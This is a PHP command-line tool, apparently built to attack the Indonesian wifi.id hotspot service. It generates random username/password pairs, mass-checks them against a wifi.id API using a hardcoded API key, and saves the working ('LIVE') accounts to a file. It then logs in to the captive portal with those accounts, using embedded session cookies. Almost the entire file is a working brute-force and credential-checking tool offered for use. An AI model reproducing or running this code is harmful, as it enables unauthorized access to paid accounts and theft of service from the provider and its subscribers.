<?php  
echo "======================================= \n";
echo "         created by xdrsyah             \n";
echo "======================================= \n";
echo "[1] xtrap wifi.id \n";
echo "[2] check result list \n";
echo "[3] auto connect wifi.id \n";
echo "[?] choose your option : ";
$opsi = trim(fgets(STDIN));
if ($opsi == "2") {
echo "[?] enter file result : ";
$file = file(trim(fgets(STDIN)));
echo "[?] enter delimiter : ";
$delim = trim(fgets(STDIN));
echo "[?] enter sleep time (min 1s) : ";
$sleep = trim(fgets(STDIN));
foreach ($file as $akon => $data) {
	$pisah = explode($delim, $data);
	$user = trim($pisah[0]);
	$pass = trim($pisah[1]);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://caramel.wifi.id/api/ott/v2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"password\":\"$pass\",\"username\":\"$user\"}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'X-Api-Key: 8d446f02-ef8d-47b2-9663-dbe75b016fb9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Cache-Control: max-age=0, no-cache';
$headers[] = 'Pragma: no-cache';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
	$act = $json->act;
	$exp = $json->expire;
	$amount = $json->amount;
	$duration = $json->duration;
	$hour = $json->hour;
	if ($act == "INVALID") {
		echo "DIE => $user|$pass \n";
	}else{
		echo "LIVE => username: $user | password: $pass | expire: $exp | amount: $amount | duration: $duration | hour: $hour \n";
		fwrite(fopen("wifi.txt", "a"), "LIVE => username: $user | password: $pass | expire: $exp | amount: $amount | duration: $duration | hour: $hour \n");
	}
	sleep($sleep);
}
}if ($opsi == "1") {
	echo "[?] awalan xtrap : ";
	$x = trim(fgets(STDIN));
	echo "[?] jumlah xtrap : ";
	$jmlh = trim(fgets(STDIN));
	
	$i = 0;
	while ($i < $jmlh) {
		$user = $x.number(str_replace("-", "", strlen($x) -15));
		$pass = name(3);
		echo "$user|$pass \n";
		fwrite(fopen("result.txt", "a"), "$user|$pass \n");
		$i++;
	}
	echo "result saved to result.txt \n";
}if ($opsi == "3") {
	echo "[?] input file result : ";
	$file = file(trim(fgets(STDIN)));
	echo "[?] input delimiter : ";
	$delim = trim(fgets(STDIN));
	foreach ($file as $akon => $data) {
		$pisah = explode($delim, $data);
		$user = trim($pisah[0]);
		$pass = trim($pisah[1]);
		$body = "username=$user@spin2&password=$pass";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://welcome2.wifi.id/authnew/login/check_login.php?ipc=10.140.70.35&gw_id=WAG-D3-LBG&mac=c0:18:85:dd:ea:2b&redirect=http://8.8.8.8/&wlan=3CBN000369/3CBN-LBG0102-0211AI:@wifi.id');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://welcome2.wifi.id';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://welcome2.wifi.id/login/?gw_id=WAG-D3-LBG&client_mac=xx:xx:xx:xx:xx:2b&wlan=3CBN000369/3CBN-LBG0102-0211AI:@wifi.id&sessionid=0402FFFF780456CF-5DD92BD0&redirect=http://8.8.8.8/';
$headers[] = 'Cookie: default_wifi=53ltq27qh88r73c40hi84ro24bio88gd; SERVERID=wpwifi4; PHPSESSID=28426uqn7550l1kddrf7k5in33';
$headers[] = 'Te: Trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
$result = $json->result;
$msg = $json->message;
if ($result == 1) {
	echo " => $msg  $user | $pass  \n";
	die;
}else{
	echo " => Login Gagal \n";
	}
}
}
	
function number($r){
	$abc = "1234567890";
	$word = "";
	for ($i=0; $i < $r ; $i++) { 
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}
function name($q){
	$abc = "abcdefghijklmnopqrstuvwxyz";
	$word = "";
	for ($i=0; $i < $q ; $i++) { 
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}
?>